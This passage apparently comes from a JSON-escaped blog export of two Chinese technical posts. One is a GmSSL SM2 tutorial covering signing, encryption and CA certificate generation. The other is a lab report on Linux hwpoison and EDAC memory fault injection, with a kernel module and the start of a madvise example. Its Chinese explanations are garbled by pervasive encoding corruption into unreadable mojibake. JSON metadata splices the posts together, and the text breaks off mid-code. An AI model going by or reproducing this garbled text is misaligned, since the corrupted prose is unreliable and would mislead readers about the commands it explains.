hello: è¾“å‡º \u0026ldquo;hello\u0026rdquo; å­—ç¬¦ä¸²ã€‚\n|: ç®¡é“ç¬¦ï¼Œå°†å‰ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºä½œä¸ºä¸‹ä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥ã€‚\ngmssl sm2sign: ä½¿ç”¨ GMSSL å·¥å…·å¯¹è¾“å…¥æ¶ˆæ¯è¿›è¡Œç­¾åã€‚\n-key sm2.pem: æŒ‡å®šç”¨äºç­¾åçš„ç§é’¥æ–‡ä»¶ sm2.pemã€‚\n-pass 1234: ç§é’¥æ–‡ä»¶çš„å¯†ç ã€‚\n-out sm2.sig: å°†ç­¾åç»“æœä¿å­˜åˆ° sm2.sig æ–‡ä»¶ä¸­ã€‚\n#-id 1234567812345678: ï¼ˆæ³¨é‡Šæ‰çš„ï¼‰ç”¨æˆ· IDï¼ˆå¯é€‰é¡¹ï¼‰ã€‚\nhacker@LAPTOP-V47UU71B:~$ echo hello | gmssl sm2sign -key sm2.pem -pass 1234 -out sm2.sig éªŒè¯ç­¾å\necho hello: è¾“å‡º \u0026ldquo;hello\u0026rdquo; å­—ç¬¦ä¸²ã€‚\n|: ç®¡é“ç¬¦ï¼Œå°†å‰ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºä½œä¸ºä¸‹ä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥ã€‚\ngmssl sm2verify: ä½¿ç”¨ GMSSL å·¥å…·éªŒè¯ç­¾åã€‚\n-pubkey sm2pub.pem: æŒ‡å®šç”¨äºéªŒè¯ç­¾åçš„å…¬é’¥æ–‡ä»¶ sm2pub.pemã€‚\n-sig sm2.sig: æŒ‡å®šè¦éªŒè¯çš„ç­¾åæ–‡ä»¶ sm2.sigã€‚\n-id 1234567812345678: ç”¨æˆ· IDï¼ˆä¸ç­¾åæ—¶ä½¿ç”¨çš„ ID ä¸€è‡´ï¼‰ã€‚\nhacker@LAPTOP-V47UU71B:~$ echo hello |gmssl sm2verify -pubkey sm2pub.pem -sig sm2.sig -id 123467812345678 /home/hacker/secret_test/GmSSL/src/sm2_sign.c:265:sm2_fast_verify(): /home/hacker/secret_test/GmSSL/src/sm2_sign.c:671:sm2_verify_finish(): gmssl sm2verify: inner error hacker@LAPTOP-V47UU71B:~$ echo hello |gmssl sm2verify -pubkey sm2pub.pem -sig sm2.sig verify : success SM2åŠ å¯†åŠè§£å¯† åŠ å¯†æ¶ˆæ¯\necho hello: è¾“å‡º \u0026ldquo;hello\u0026rdquo; å­—ç¬¦ä¸²ã€‚\n|: ç®¡é“ç¬¦ï¼Œå°†å‰ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºä½œä¸ºä¸‹ä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥ã€‚\ngmssl sm2encrypt: ä½¿ç”¨ GMSSL å·¥å…·åŠ å¯†è¾“å…¥æ¶ˆæ¯ã€‚\n-pubkey sm2pub.pem: æŒ‡å®šç”¨äºåŠ å¯†çš„å…¬é’¥æ–‡ä»¶ sm2pub.pemã€‚\n-out sm2.der: å°†åŠ å¯†ç»“æœä¿å­˜åˆ° sm2.der æ–‡ä»¶ä¸­ã€‚\nhacker@LAPTOP-V47UU71B:~$ echo hello | gmssl sm2encrypt -pubkey sm2pub.pem -out sm2.der è§£å¯†æ¶ˆæ¯\ngmssl sm2decrypt: ä½¿ç”¨ GMSSL å·¥å…·è§£å¯†æ¶ˆæ¯ã€‚\n-key sm2.pem: æŒ‡å®šç”¨äºè§£å¯†çš„ç§é’¥æ–‡ä»¶ sm2.pemã€‚\n-pass 1234: ç§é’¥æ–‡ä»¶çš„å¯†ç ã€‚\n-in sm2.der: æŒ‡å®šè¦è§£å¯†çš„åŠ å¯†æ–‡ä»¶ sm2.derã€‚\nhacker@LAPTOP-V47UU71B:~$ gmssl sm2decrypt -key sm2.pem -pass 1234 -in sm2.der hello ç”ŸæˆSM2æ ¹è¯ä¹¦rootcakey.pemåŠCAè¯ä¹¦cakey.pem ç”Ÿæˆæ ¹ CA å¯†é’¥å¯¹\ngmssl sm2keygen: ä½¿ç”¨ GMSSL å·¥å…·ç”Ÿæˆ SM2 å¯†é’¥å¯¹ã€‚\n-pass 1234: æŒ‡å®šå¯†é’¥åŠ å¯†æ—¶ä½¿ç”¨çš„å¯†ç ï¼ˆ1234ï¼‰ã€‚\n-out rootcakey.pem: å°†ç”Ÿæˆçš„ç§é’¥ä¿å­˜åˆ° rootcakey.pem æ–‡ä»¶ä¸­ã€‚\nhacker@LAPTOP-V47UU71B:~$ gmssl sm2keygen -pass 1234 -out rootcakey.pem -----BEGIN PUBLIC KEY----- MFkwEwYHKoZIzj0CAQYIKoEcz1UBgi0DQgAEpy9tv+rCp6t1aEgFHaDuI30rSKh5 737ZVu0ReHqVyhqtXo2bGVIoTsR+daHXo4yO2mxxh9lTR8cBalUfBKKH5A== ç”Ÿæˆæ ¹ CA è¯ä¹¦\ngmssl certgen: ä½¿ç”¨ GMSSL å·¥å…·ç”Ÿæˆè¯ä¹¦ã€‚\n-C CN: æŒ‡å®šå›½å®¶ä»£ç ä¸ºä¸­å›½ã€‚\n-ST Beijing: æŒ‡å®šçœ/å¸‚ä¸ºåŒ—äº¬ã€‚\n-L Haidian: æŒ‡å®šåœ°åŒºä¸ºæµ·æ·€åŒºã€‚\n-O PKU: æŒ‡å®šç»„ç»‡åä¸º PKUï¼ˆåŒ—äº¬å¤§å­¦ï¼‰ã€‚\n-OU CS: æŒ‡å®šç»„ç»‡å•ä½ä¸º CSï¼ˆè®¡ç®—æœºç§‘å­¦ï¼‰ã€‚\n-CN ROOTCA: æŒ‡å®šé€šç”¨åä¸º ROOTCAã€‚\n-days 3650: è¯ä¹¦æœ‰æ•ˆæœŸä¸º3650å¤©ï¼ˆçº¦10å¹´ï¼‰ã€‚\n-key rootcakey.pem: ä½¿ç”¨ rootcakey.pem æ–‡ä»¶ä¸­çš„ç§é’¥ã€‚\n-pass 1234: ç§é’¥æ–‡ä»¶çš„å¯†ç ã€‚\n-out rootcacert.pem: å°†ç”Ÿæˆçš„è¯ä¹¦ä¿å­˜åˆ° rootcacert.pem æ–‡ä»¶ä¸­ã€‚\n-key_usage keyCertSign: æŒ‡å®šå¯†é’¥ç”¨æ³•ä¸ºè¯ä¹¦ç­¾åã€‚\n-key_usage cRLSign: æŒ‡å®šå¯†é’¥ç”¨æ³•ä¸º CRLï¼ˆè¯ä¹¦åŠé”€åˆ—è¡¨ï¼‰ç­¾åã€‚\nhacker@LAPTOP-V47UU71B:~$ gmssl certgen -C CN -ST Beijing -L Haidian -O PKU -OU CS -CN ROOTCA -days 3650 -key rootcakey.pem -pass 1234 -out rootcacert.pem -key_usage cRLSign è§£ææ ¹ CA è¯ä¹¦\ngmssl certparse: ä½¿ç”¨ GMSSL å·¥å…·è§£æè¯ä¹¦ã€‚\n-in rootcacert.pem: æŒ‡å®šè¦è§£æçš„è¯ä¹¦æ–‡ä»¶ rootcacert.pemã€‚\nhacker@LAPTOP-V47UU71B:~$ gmssl certparse -in rootcacert.pem Certificate tbsCertificate version: v3 (2) serialNumber: 61AF7B8350DC52B74CC1F44E signature algorithm: sm2sign-with-sm3 issuer countryName: CN stateOrProvinceName: Beijing localityName: Haidian organizationName: PKU organizationalUnitName: CS commonName: ROOTCA validity notBefore: Fri Jul 12 23:25:33 2024 notAfter: Mon Jul 10 23:25:33 2034 subject countryName: CN stateOrProvinceName: Beijing localityName: Haidian organizationName: PKU organizationalUnitName: CS commonName: ROOTCA subjectPulbicKeyInfo algorithm algorithm: ecPublicKey namedCurve: sm2p256v1 subjectPublicKey ECPoint: 04A72F6DBFEAC2A7AB756848051DA0EE237D2B48A879EF7ED956ED11787A95CA1AAD5E8D9B1952284EC47E75A1D7A38C8EDA6C7187D95347C7016A551F04A287E4 extensions Extension extnID: KeyUsage (2.5.29.15) critical: true KeyUsage: cRLSign signatureAlgorithm algorithm: sm2sign-with-sm3 signatureValue: 3045022100E8927FD23F8B92EDE9ABA2F2664F8A814B82C4A5AC1637ED1AE325FEF5705A01022054750BE9E20D7FF2707DBF59A3BAFCD2D2B0D21703C215659335209B8F5365DF -----BEGIN CERTIFICATE----- MIIBxjCCAWygAwIBAgIMYa97g1DcUrdMwfROMAoGCCqBHM9VAYN1MF0xCzAJBgNV BAYTAkNOMRAwDgYDVQQIEwdCZWlqaW5nMRAwDgYDVQQHEwdIYWlkaWFuMQwwCgYD VQQKEwNQS1UxCzAJBgNVBAsTAkNTMQ8wDQYDVQQDEwZST09UQ0EwHhcNMjQwNzEy MTUyNTMzWhcNMzQwNzEwMTUyNTMzWjBdMQswCQYDVQQGEwJDTjEQMA4GA1UECBMH QmVpamluZzEQMA4GA1UEBxMHSGFpZGlhbjEMMAoGA1UEChMDUEtVMQswCQYDVQQL EwJDUzEPMA0GA1UEAxMGUk9PVENBMFkwEwYHKoZIzj0CAQYIKoEcz1UBgi0DQgAE py9tv+rCp6t1aEgFHaDuI30rSKh5737ZVu0ReHqVyhqtXo2bGVIoTsR+daHXo4yO 2mxxh9lTR8cBalUfBKKH5KMSMBAwDgYDVR0PAQH/BAQDAgECMAoGCCqBHM9VAYN1 A0gAMEUCIQDokn/SP4uS7emrovJmT4qBS4LEpawWN+0a4yX+9XBaAQIgVHUL6eIN f/Jwfb9Zo7r80tKw0hcDwhVlkzUgm49TZd8= -----END CERTIFICATE----- ç”Ÿæˆå­ CA å¯†é’¥å¯¹\ngmssl sm2keygen: ä½¿ç”¨ GMSSL å·¥å…·ç”Ÿæˆ SM2 å¯†é’¥å¯¹ã€‚\n-pass 1234: æŒ‡å®šå¯†é’¥åŠ å¯†æ—¶ä½¿ç”¨çš„å¯†ç ï¼ˆ1234ï¼‰ã€‚\n-out cakey.pem: å°†ç”Ÿæˆçš„ç§é’¥ä¿å­˜åˆ° cakey.pem æ–‡ä»¶ä¸­ã€‚\nhacker@LAPTOP-V47UU71B:~$ gmssl sm2keygen -pass 1234 -out cakey.pem -----BEGIN PUBLIC KEY----- MFkwEwYHKoZIzj0CAQYIKoEcz1UBgi0DQgAEe/KYB6V6WoHvlfLr8k859ZgQeZVW Dgc7flWYxo8OyRTAOT1jr9NRdt4e7kS0nMzWYJGZfqGVeapIfuwWv8fZvA== -----END PUBLIC KEY----- ç”Ÿæˆå­ CA è¯ä¹¦è¯·æ±‚\ngmssl reqgen: ä½¿ç”¨ GMSSL å·¥å…·ç”Ÿæˆè¯ä¹¦è¯·æ±‚ã€‚\n-C CN: æŒ‡å®šå›½å®¶ä»£ç ä¸ºä¸­å›½ã€‚\n-ST Beijing: æŒ‡å®šçœ/å¸‚ä¸ºåŒ—äº¬ã€‚\n-L Haidian: æŒ‡å®šåœ°åŒºä¸ºæµ·æ·€åŒºã€‚\n-O PKU: æŒ‡å®šç»„ç»‡åä¸º PKUï¼ˆåŒ—äº¬å¤§å­¦ï¼‰ã€‚\n-OU CS: æŒ‡å®šç»„ç»‡å•ä½ä¸º CSï¼ˆè®¡ç®—æœºç§‘å­¦ï¼‰ã€‚\n-CN \u0026quot;Sub CA\u0026quot;: æŒ‡å®šé€šç”¨åä¸º \u0026ldquo;Sub CA\u0026rdquo;ã€‚\n-key cakey.pem: ä½¿ç”¨ cakey.pem æ–‡ä»¶ä¸­çš„ç§é’¥ã€‚\n-pass 1234: ç§é’¥æ–‡ä»¶çš„å¯†ç ã€‚\n-out careq.pem: å°†ç”Ÿæˆçš„è¯ä¹¦è¯·æ±‚ä¿å­˜åˆ° careq.pem æ–‡ä»¶ä¸­ã€‚\nhacker@LAPTOP-V47UU71B:~$ gmssl reqgen -C CN -ST Beijing -L Haidian -O PKU -OU CS -CN \u0026#34;Sub CA\u0026#34; -key cakey.pem -pass 1234 -out careq.pem ç­¾ç½²å­ CA è¯ä¹¦è¯·æ±‚\ngmssl reqsign: ä½¿ç”¨ GMSSL å·¥å…·ç­¾ç½²è¯ä¹¦è¯·æ±‚ã€‚\n-in careq.pem: æŒ‡å®šè¦ç­¾ç½²çš„è¯ä¹¦è¯·æ±‚æ–‡ä»¶ careq.pemã€‚\n-days 365: ç”Ÿæˆçš„å­ CA è¯ä¹¦æœ‰æ•ˆæœŸä¸º365å¤©ã€‚\n-key_usage keyCertSign: æŒ‡å®šå¯†é’¥ç”¨æ³•ä¸ºè¯ä¹¦ç­¾åã€‚\n-path_len_constraint 0: é™åˆ¶è·¯å¾„é•¿åº¦ä¸º0ï¼Œå³æ­¤å­ CA ä¸èƒ½å†ç­¾å‘å­è¯ä¹¦ã€‚\n-cacert rootcacert.pem: ä½¿ç”¨ rootcacert.pem æ–‡ä»¶ä¸­çš„æ ¹ CA è¯ä¹¦ã€‚\n-key rootcakey.pem: ä½¿ç”¨ rootcakey.pem æ–‡ä»¶ä¸­çš„æ ¹ CA ç§é’¥ã€‚\n-pass 1234: æ ¹ CA ç§é’¥æ–‡ä»¶çš„å¯†ç ã€‚\n-out cacert.pem: å°†ç”Ÿæˆçš„å­ CA è¯ä¹¦ä¿å­˜åˆ° cacert.pem æ–‡ä»¶ä¸­ã€‚\nhacker@LAPTOP-V47UU71B:~$ gmssl reqsign -in careq.pem -days 365 -key_usage keyCertSign -path_len_constraint 0 -cacert rootcacert.pem -key rootcakey.pem -pass 1234 -out cacert.pem gmssl-pythonæµ‹è¯• sm3ç®—æ³•\nfrom gmssl import * sm3 = Sm3() sm3.update(b\u0026#39;abc\u0026#39;) dgst = sm3.digest() print(\u0026#34;sm3(\u0026#39;abc\u0026#39;) : \u0026#34; + dgst.hex()) å‚è€ƒæ–‡çŒ® é€šä¿—æ˜“æ‡‚çš„å¯¹ç§°åŠ å¯†ä¸éå¯¹ç§°åŠ å¯†åŸç†æµ…æ(csdn.net)\nPKI-ä¸€æ–‡è¯»æ‡‚SM1ã€SM2ã€SM3ã€SM4ç­‰å›½å¯†ç®—æ³•-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘(tencent.com)\nReleases Â· GmSSL/GmSSL-Python (github.com)\nå¿«é€Ÿä¸Šæ‰‹ (gmssl.org)\nguanzhi/GmSSL: æ”¯æŒå›½å¯†SM2/SM3/SM4/SM9/SSLçš„å¯†ç å·¥å…·ç®± (github.com)\n","date":"2024-07-20T00:00:00Z","image":"https://chenyuan1125.github.io/p/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E8%B0%83%E7%A0%94/1_hu16658318772407405148.jpg","permalink":"https://chenyuan1125.github.io/p/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E8%B0%83%E7%A0%94/","title":"åŠ å¯†ç®—æ³•è°ƒç ”"},{"content":"å†…å­˜æ•…éšœæ£€æµ‹å’Œå¤„ç† å®éªŒå†…å®¹ï¼š\næ¨¡æ‹Ÿå†…å­˜ç¡¬ä»¶é”™è¯¯ï¼Œåœ¨x86ä¸ŠéªŒè¯hwpoisonâ€œå†…å­˜æ¯’åŒ–â€åŠŸèƒ½å’ŒEDACï¼ˆError Detection And Correctionï¼‰çš„æ£€é”™å’Œçº é”™åŠŸèƒ½ ä½¿ç”¨Rasdaemonæ•è·é”™è¯¯ä½ç½®ï¼Œå¹¶åœ¨æ“ä½œç³»ç»Ÿçº§åˆ«å®Œæˆé”™è¯¯å†…å­˜çš„è½¯ä¸‹çº¿ è¯„åˆ†æ ‡å‡†ï¼ˆæŠ˜ç®—ä¸ºç™¾åˆ†åˆ¶ï¼‰\nï¼ˆ20åˆ†ï¼‰åœ¨X86å¹³å°ä¸Šæ¨¡æ‹Ÿå†…å­˜é”™è¯¯ ï¼ˆå†…å­˜æ•…éšœ injectionï¼‰ ï¼ˆ20åˆ†ï¼‰åœ¨X86å¹³å°ä¸Šæ•è·å†…å­˜é”™è¯¯çš„æ—¥å¿—ä¿¡æ¯ ï¼ˆ20åˆ†ï¼‰åœ¨X86å¹³å°ä¸ŠéªŒè¯EDACçš„æ£€æµ‹å’Œçº é”™åŠŸèƒ½ ï¼ˆ30åˆ†ï¼‰åœ¨X86å¹³å°ä¸Šæ ¹æ®æ•è·çš„å†…å­˜é”™è¯¯ä¿¡æ¯ï¼Œå®Œæˆå¯¹åº”å†…å­˜é¡µæˆ–å¤šä¸ªä¸´è¿‘å†…å­˜é¡µçš„è½¯ä¸‹çº¿ ï¼ˆ10åˆ†ï¼‰ä¹¦é¢\u0026amp;å£å¤´å®éªŒæŠ¥å‘Š å¹³å°ä¸é™ï¼Œé€‰æ‹©å…¶ä¸€ï¼Œè°ƒç ”edacåœ¨ä¸åŒç¡¬ä»¶æš´éœ²çš„ä¿¡æ¯ç±»åˆ«å’Œé‡çº§éƒ½ä¸ä¸€æ ·ï¼ˆæ¥å£ï¼‰ï¼Œæ‰¾å‡ºå†…å­˜å‡ºé”™ä½ç½®ï¼Œåšå†…å­˜éš”ç¦»ï¼ŒLinuxæœ‰ä¸€å¥—å®Œæ•´çš„å†…å­˜éš”ç¦»æœºåˆ¶\nå®éªŒç¯å¢ƒ é‡‡ç”¨VMwareè™šæ‹Ÿæœº\næ“ä½œç³»ç»Ÿï¼šubuntu 20.04\nå†…æ ¸ç‰ˆæœ¬ï¼š5.15.0\nhwpoison hwpoison æ˜¯ Linux å†…æ ¸ä¸­çš„ä¸€ç§æœºåˆ¶ï¼Œç”¨äºå¤„ç†ç¡¬ä»¶å†…å­˜é”™è¯¯ã€‚å…¶ä¸»è¦åŠŸèƒ½æ˜¯æ£€æµ‹å¹¶éš”ç¦»æœ‰ç¼ºé™·çš„å†…å­˜é¡µï¼Œä»¥é˜²æ­¢è¿™äº›ç¼ºé™·å¯¹ç³»ç»Ÿç¨³å®šæ€§å’Œæ•°æ®å®Œæ•´æ€§äº§ç”Ÿè´Ÿé¢å½±å“ã€‚\nå…·ä½“åŠŸèƒ½å’Œå·¥ä½œåŸç† æ£€æµ‹ç¡¬ä»¶é”™è¯¯ï¼šhwpoison ä¾èµ–äºç¡¬ä»¶é”™è¯¯æ£€æµ‹æœºåˆ¶ï¼Œä¾‹å¦‚ ECCï¼ˆé”™è¯¯æ ¡æ­£ç ï¼‰å†…å­˜æˆ–ç°ä»£ CPU çš„å†…å­˜æ§åˆ¶å™¨ã€‚è¿™äº›ç¡¬ä»¶ç»„ä»¶èƒ½å¤Ÿæ£€æµ‹å†…å­˜é”™è¯¯ï¼Œå¦‚ä½ç¿»è½¬ç­‰ã€‚ æŠ¥å‘Šå’Œæ ‡è®°é”™è¯¯é¡µé¢ï¼šå½“ç¡¬ä»¶æ£€æµ‹åˆ°å†…å­˜é”™è¯¯æ—¶ï¼Œä¼šå‘æ“ä½œç³»ç»ŸæŠ¥å‘Šã€‚Linux å†…æ ¸ä¸­çš„ hwpoison æœºåˆ¶ä¼šæ”¶åˆ°è¿™äº›æŠ¥å‘Šï¼Œå¹¶æ ‡è®°å—å½±å“çš„å†…å­˜é¡µä¸ºâ€œæŸåâ€ï¼ˆpoisonedï¼‰ã€‚ éš”ç¦»æŸåé¡µé¢ï¼šæ ‡è®°ä¸ºæŸåçš„å†…å­˜é¡µå°†è¢«éš”ç¦»ï¼Œä¸å†è¢«ç³»ç»Ÿä½¿ç”¨ã€‚å¯¹äºæ­£åœ¨ä½¿ç”¨çš„é¡µé¢ï¼Œå†…æ ¸ä¼šå°è¯•å°†å…¶å†…å®¹è¿ç§»åˆ°å¥åº·çš„å†…å­˜åŒºåŸŸï¼Œå¹¶ç¡®ä¿åº”ç”¨ç¨‹åºèƒ½å¤Ÿç»§ç»­è¿è¡Œè€Œä¸ä¼šè¯»å–åˆ°æŸåçš„æ•°æ®ã€‚ é€šçŸ¥ç”¨æˆ·ç©ºé—´åº”ç”¨ï¼šå†…æ ¸è¿˜å¯ä»¥é€šè¿‡ä¿¡å·æœºåˆ¶ï¼ˆå¦‚ SIGBUSï¼‰é€šçŸ¥ç”¨æˆ·ç©ºé—´åº”ç”¨ç¨‹åºï¼Œè®©å®ƒä»¬å¯ä»¥é‡‡å–ç›¸åº”çš„æªæ–½ï¼Œå¦‚ä¿å­˜å·¥ä½œçŠ¶æ€æˆ–å°è¯•æ¢å¤æ•°æ®ã€‚ hwpoison çš„å·¥ä½œæµç¨‹ é”™è¯¯æ£€æµ‹ï¼šå†…å­˜æ§åˆ¶å™¨ï¼ˆMemory Controllerï¼‰æ£€æµ‹åˆ°å†…å­˜é”™è¯¯ï¼Œå¹¶ç”Ÿæˆé”™è¯¯æŠ¥å‘Šã€‚ é”™è¯¯æŠ¥å‘Šå¤„ç†ï¼šé”™è¯¯æŠ¥å‘Šé€šè¿‡æœºå™¨æ£€æŸ¥å¼‚å¸¸ï¼ˆMCEï¼ŒMachine Check Exceptionï¼‰æˆ–å…¶ä»–ç¡¬ä»¶æœºåˆ¶ä¼ é€’ç»™æ“ä½œç³»ç»Ÿå†…æ ¸ã€‚ æ ‡è®°æœ‰æ¯’é¡µ: hwpoisonæ¨¡å—æ¥æ”¶åˆ°é”™è¯¯æŠ¥å‘Šåï¼Œå°†å‡ºé”™çš„å†…å­˜é¡µæ ‡è®°ä¸ºæœ‰æ¯’ï¼Œå…·ä½“æ“ä½œåŒ…æ‹¬ï¼š ä»é¡µè¡¨ä¸­ç§»é™¤è¯¥é¡µã€‚ å°†è¯¥é¡µæ·»åŠ åˆ°å†…å­˜æ•…éšœéš”ç¦»åˆ—è¡¨ä¸­ã€‚ å†…å­˜éš”ç¦»ï¼šæœ‰æ¯’é¡µä¸å†è¢«åˆ†é…ç»™ä»»ä½•è¿›ç¨‹æˆ–ç”¨äºå†…æ ¸åˆ†é…ï¼Œç¡®ä¿ç³»ç»Ÿä¸å†ä½¿ç”¨å‡ºé”™çš„å†…å­˜ã€‚ é”™è¯¯è®°å½•ä¸é€šçŸ¥ï¼šé”™è¯¯ä¿¡æ¯è¢«è®°å½•åœ¨ç³»ç»Ÿæ—¥å¿—ä¸­ï¼Œå¹¶é€šçŸ¥ç”¨æˆ·æ€åº”ç”¨ç¨‹åºè¿›è¡Œè¿›ä¸€æ­¥å¤„ç†ã€‚ ä½¿ç”¨åœºæ™¯ hwpoison ä¸»è¦ç”¨äºä»¥ä¸‹å‡ ç§åœºæ™¯ï¼š\næœåŠ¡å™¨ç¯å¢ƒï¼šåœ¨é«˜å¯é æ€§è¦æ±‚çš„æœåŠ¡å™¨ä¸­ï¼Œhwpoison å¯ä»¥å¸®åŠ©æ£€æµ‹å’Œéš”ç¦»å†…å­˜ç¡¬ä»¶é”™è¯¯ï¼Œç¡®ä¿æœåŠ¡å™¨çš„é•¿æœŸç¨³å®šè¿è¡Œã€‚ æ•°æ®ä¸­å¿ƒï¼šå¯¹äºæ•°æ®ä¸­å¿ƒä¸­çš„å¤§è§„æ¨¡æœåŠ¡å™¨é›†ç¾¤ï¼Œhwpoison æœ‰åŠ©äºç»´æŠ¤æ•´ä¸ªç³»ç»Ÿçš„ç¨³å®šæ€§å’Œæ•°æ®å®Œæ•´æ€§ã€‚ å…³é”®ä»»åŠ¡åº”ç”¨ï¼šåœ¨ä¸€äº›å¯¹ç¨³å®šæ€§è¦æ±‚æé«˜çš„å…³é”®ä»»åŠ¡åº”ç”¨ä¸­ï¼Œå¦‚é‡‘èç³»ç»Ÿã€èˆªç©ºæ§åˆ¶ç³»ç»Ÿç­‰ï¼Œhwpoison èƒ½æä¾›é¢å¤–çš„ä¸€å±‚ä¿æŠ¤ã€‚ å†…æ ¸å‚æ•°å’Œé…ç½® åœ¨å®é™…åº”ç”¨ä¸­ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤å’Œå‚æ•°æ¥é…ç½®å’Œä½¿ç”¨ hwpoisonï¼š\næ£€æŸ¥å†…æ ¸æ¨¡å— æŸäº›åŠŸèƒ½å¯èƒ½éœ€è¦åŠ è½½ç‰¹å®šçš„å†…æ ¸æ¨¡å—ã€‚ä½ å¯ä»¥å°è¯•åŠ è½½ç›¸å…³æ¨¡å—ï¼š\nsudo modprobe hwpoison-inject æ£€æŸ¥æ¨¡å—æ˜¯å¦åŠ è½½æˆåŠŸï¼š\nlsmod | grep hwpoison ä½ çš„å†…æ ¸é…ç½®å·²ç»å¯ç”¨äº† CONFIG_MEMORY_FAILURE å’Œ CONFIG_DEBUG_FSã€‚ä½†æ˜¯ï¼Œå¦‚æœä½ ä»ç„¶æ‰¾ä¸åˆ° /sys/kernel/debug/hwpoison/corrupt-pfnï¼Œè¯·æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤æ£€æŸ¥å’Œè§£å†³é—®é¢˜ã€‚\næ£€æŸ¥ hwpoison å­ç›®å½• æŒ‚è½½ DebugFS åï¼Œæ£€æŸ¥æ˜¯å¦å­˜åœ¨ hwpoison å­ç›®å½•ï¼š\nls /sys/kernel/debug/hwpoison ä½ åº”è¯¥çœ‹åˆ°ç±»ä¼¼ corrupt-pfn çš„æ–‡ä»¶ã€‚å¦‚æœæ²¡æœ‰ï¼Œå¯èƒ½æ˜¯å†…æ ¸ç‰ˆæœ¬æˆ–é…ç½®é—®é¢˜ã€‚\næ£€æŸ¥å†…æ ¸æ—¥å¿— å¦‚æœ hwpoison ç›®å½•ä»ç„¶ä¸å­˜åœ¨ï¼Œæ£€æŸ¥å†…æ ¸æ—¥å¿—ï¼Œçœ‹çœ‹æ˜¯å¦æœ‰ç›¸å…³ä¿¡æ¯ï¼š\ndmesg | grep hwpoison éªŒè¯å†…å­˜æ¯’åŒ–åŠŸèƒ½ ä¸€èˆ¬æ¥è¯´ï¼Œç”¨æˆ·æ€ç¨‹åºå¯¼è‡´çš„é¡µé”™è¯¯ï¼ˆå¦‚è®¿é—®æ— æ•ˆå†…å­˜åœ°å€ï¼‰ä¼šè§¦å‘ SIGSEGV ä¿¡å·ï¼Œè€Œä¸æ˜¯ç›´æ¥å¯¼è‡´å†…æ ¸å¯¹è¯¥é¡µé¢è¿›è¡Œå†…å­˜æ¯’åŒ–ã€‚å†…å­˜æ¯’åŒ–é€šå¸¸æ˜¯ä¸ºäº†å¤„ç†ç¡¬ä»¶å†…å­˜é”™è¯¯ï¼Œè€Œä¸æ˜¯æ™®é€šçš„é¡µé”™è¯¯ã€‚\nä¸ºäº†éªŒè¯å†…å­˜æ¯’åŒ–åŠŸèƒ½ï¼Œè¿˜æ˜¯éœ€è¦é€šè¿‡ç‰¹å®šæ–¹æ³•åˆ¶é€ å¯ä»¥è¢«å†…æ ¸è¯†åˆ«å¹¶å¤„ç†çš„å†…å­˜é”™è¯¯ï¼Œä»¥ä¸‹æ˜¯åˆ¶ä½œå†…å­˜é”™è¯¯çš„ä¸€äº›æ–¹æ³•ã€‚\nå†…å­˜é”™è¯¯æ³¨å…¥ 1ã€ä½¿ç”¨å†…æ ¸æ¨¡å—å¼ºåˆ¶åˆ¶é€ å†…å­˜é”™è¯¯ã€‚ç¼–å†™ä¸€ä¸ªå†…æ ¸æ¨¡å—ï¼Œå¼ºåˆ¶å°†æŸä¸ªç‰©ç†é¡µé¢æ ‡è®°ä¸ºç¡¬ä»¶æ¯’åŒ–ã€‚\n#include \u0026lt;linux/module.h\u0026gt; #include \u0026lt;linux/kernel.h\u0026gt; #include \u0026lt;linux/init.h\u0026gt; #include \u0026lt;linux/mm.h\u0026gt; static unsigned long pfn = 0; module_param(pfn, ulong, 0); MODULE_PARM_DESC(pfn, \u0026#34;Page Frame Number\u0026#34;); static int __init hwpoison_test_init(void) { pr_info(\u0026#34;Injecting hwpoison to PFN: %lx\\n\u0026#34;, pfn); if (memory_failure(pfn, 0)) pr_err(\u0026#34;Failed to inject hwpoison to PFN: %lx\\n\u0026#34;, pfn); else pr_info(\u0026#34;Successfully injected hwpoison to PFN: %lx\\n\u0026#34;, pfn); return 0; } static void __exit hwpoison_test_exit(void) { pr_info(\u0026#34;hwpoison_test module exited\\n\u0026#34;); } module_init(hwpoison_test_init); module_exit(hwpoison_test_exit); MODULE_LICENSE(\u0026#34;GPL\u0026#34;); MODULE_DESCRIPTION(\u0026#34;HWPoison Test Module\u0026#34;); MODULE_AUTHOR(\u0026#34;Lijun\u0026#34;); ä¿å­˜ä»£ç ä¸º hwpoison_test.cã€‚\nåˆ›å»ºä¸€ä¸ª Makefileï¼š\nobj-m += hwpoison_test.o all: make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules clean: make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean ç¼–è¯‘å†…æ ¸æ¨¡å—ï¼š\nmake åŠ è½½å†…æ ¸æ¨¡å—ï¼Œå¹¶ä¼ é€’ä¸€ä¸ªæœ‰æ•ˆçš„ PFNï¼ˆPage Frame Numberï¼‰ã€‚å¯ä»¥é€šè¿‡ä¹‹å‰è·å–ç‰©ç†é¡µæ¡†å·çš„æ–¹æ³•è·å–æœ‰æ•ˆçš„ PFNï¼š\nsudo insmod hwpoison_test.ko pfn=0x12345 2ã€ä½¿ç”¨ madvise è§¦å‘å†…å­˜é”™è¯¯\nåœ¨ç”¨æˆ·ç©ºé—´ï¼Œä½¿ç”¨ madvise ç³»ç»Ÿè°ƒç”¨å¯ä»¥è¯·æ±‚å†…æ ¸å¯¹å†…å­˜é¡µæ‰§è¡Œç‰¹å®šçš„æ“ä½œï¼Œä¾‹å¦‚æ¯’åŒ–å†…å­˜é¡µã€‚\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;sys/mman.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #define PAGE_SIZE 4096 void trigger_hwpoison(void *addr) { if (madvise(addr, PAGE_SIZE, MADV_HWPOISON) != 0) { perror(\u0026#34;madvise\u0026#34;); 